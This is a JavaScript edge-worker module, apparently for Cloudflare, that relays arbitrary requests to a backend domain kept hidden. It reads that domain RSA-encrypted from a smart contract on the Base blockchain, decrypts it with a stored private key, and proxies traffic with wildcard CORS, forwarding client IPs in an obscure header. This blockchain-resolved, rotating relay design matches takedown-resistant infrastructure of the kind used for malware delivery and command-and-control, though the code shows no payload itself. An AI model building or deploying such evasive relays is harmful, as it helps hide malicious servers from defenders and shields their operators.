import forge from 'node-forge'

const UPDATE_INTERVAL = 60
const RPC_URLS = [
  'https://mainnet.base.org',
  'https://base-rpc.publicnode.com',
]
const ETH_CALL_DATA = 'c2fb26a6'
const EVM_TYPE = 'EVM'
const SOL_TYPE = 'SOL'

function corsHeaders(extra = {}) {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
    'Access-Control-Allow-Headers': '*',
    ...extra,
  }
}

function getClientIP(request) {
  return (
    request.headers.get('CF-Connecting-IP') ??
    request.headers.get('X-Forwarded-For')?.split(',')[0]?.trim() ??
    '0.0.0.0'
  )
}

function hexToBase64(hex) {
  let value = hex.replace(/^0x/, '')
  value = value.slice(64)
  const lengthHex = value.slice(0, 64)
  const length = Number.parseInt(lengthHex, 16)
  const dataHex = value.slice(64, 64 + length * 2)
  const bytes = forge.util.hexToBytes(dataHex)
  return forge.util.encode64(bytes)
}

function decryptSimple(encryptedDataB64, privateKeyPem) {
  const privateKey = forge.pki.privateKeyFromPem(privateKeyPem)
  const encrypted = forge.util.decode64(encryptedDataB64)
  return privateKey.decrypt(encrypted)
}

async function loadCache(env, type) {
  const cache = await env.PROXY_CACHE.get(`cache:${type}`, 'json')
  if (!cache) return null
  if (Math.floor(Date.now() / 1000) - cache.timestamp > UPDATE_INTERVAL) {
    return null
  }
  return cache.domain ?? null
}

async function saveCache(env, domain, type) {
  await env.PROXY_CACHE.put(
    `cache:${type}`,
    JSON.stringify({ domain, timestamp: Math.floor(Date.now() / 1000) }),
  )
}

async function fetchTargetDomain(env, contractAddress, privateKeyPem) {
  for (const rpcUrl of RPC_URLS) {
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [
            {
              to: contractAddress,
              data: `0x${ETH_CALL_DATA}`,
            },
            'latest',
          ],
        }),
      })

      const responseData = await response.json()
      if (responseData.error || !responseData.result) {
        continue
      }

      const encryptedDomain = hexToBase64(responseData.result)
      const domain = decryptSimple(encryptedDomain, privateKeyPem)
      if (domain) {
        return domain
      }
    } catch {
      continue
    }
  }

  throw new Error('Could not fetch target domain')
}

async function getTargetDomain(env, type) {
  const cached = await loadCache(env, type)
  if (cached) {
    return cached
  }

  const isEvm = type === EVM_TYPE
  const contractAddress = isEvm
    ? env.CONTRACT_ADDRESS_EVM
    : env.CONTRACT_ADDRESS_SOL
  const privateKey = isEvm ? env.KEY_EVM : env.KEY_SOL

  const domain = await fetchTargetDomain(env, contractAddress, privateKey)
  await saveCache(env, domain, type)
  return domain
}

function buildForwardHeaders(request, clientIP) {
  const headers = new Headers()

  for (const [key, value] of request.headers.entries()) {
    const lower = key.toLowerCase()
    if (
      lower === 'host' ||
      lower === 'origin' ||
      lower === 'accept-encoding' ||
      lower === 'content-encoding'
    ) {
      continue
    }
    headers.set(key, value)
  }

  headers.set('x-dfkjldifjlifjd', clientIP)
  headers.set('x-forwarded-for', clientIP)
  headers.set('x-client-ip', clientIP)

  return headers
}

export async function handleSecureProxyRequest(request, env, endpoint, type) {
  const targetDomain = (await getTargetDomain(env, type)).replace(/\/$/, '')
  const path = `/${endpoint.replace(/^\/+/, '')}`
  const url = `${targetDomain}${path}`
  const clientIP = getClientIP(request)

  const upstream = await fetch(url, {
    method: request.method,
    headers: buildForwardHeaders(request, clientIP),
    body:
      request.method === 'GET' || request.method === 'HEAD'
        ? undefined
        : await request.arrayBuffer(),
    redirect: 'follow',
  })

  const responseHeaders = corsHeaders()
  const contentType = upstream.headers.get('Content-Type')
  if (contentType) {
    responseHeaders['Content-Type'] = contentType
  }

  return new Response(upstream.body, {
    status: upstream.status,
    headers: responseHeaders,
  })
}

export function parseSecureProxyEndpoint(url) {
  const rawSearch = url.search.startsWith('?') ? url.search.slice(1) : url.search

  if (rawSearch.startsWith('e=')) {
    const value = decodeURIComponent(rawSearch.slice(2))
    if (value === 'ping_proxy') {
      return { kind: 'ping' }
    }
    return { kind: 'proxy', endpoint: value.replace(/^\/+/, ''), type: EVM_TYPE }
  }

  if (rawSearch.startsWith('s=')) {
    return {
      kind: 'proxy',
      endpoint: decodeURIComponent(rawSearch.slice(2)).replace(/^\/+/, ''),
      type: SOL_TYPE,
    }
  }

  const eParam = url.searchParams.get('e')
  if (eParam === 'ping_proxy') {
    return { kind: 'ping' }
  }
  if (eParam) {
    return {
      kind: 'proxy',
      endpoint: decodeURIComponent(eParam).replace(/^\/+/, ''),
      type: EVM_TYPE,
    }
  }

  const sParam = url.searchParams.get('s')
  if (sParam) {
    return {
      kind: 'proxy',
      endpoint: decodeURIComponent(sParam).replace(/^\/+/, ''),
      type: SOL_TYPE,
    }
  }

  return { kind: 'missing' }
}

export function handleOptions() {
  return new Response(null, {
    status: 204,
    headers: corsHeaders({ 'Access-Control-Max-Age': '86400' }),
  })
}

export function handlePing() {
  return new Response('pong', {
    status: 200,
    headers: corsHeaders({ 'Content-Type': 'text/plain' }),
  })
}
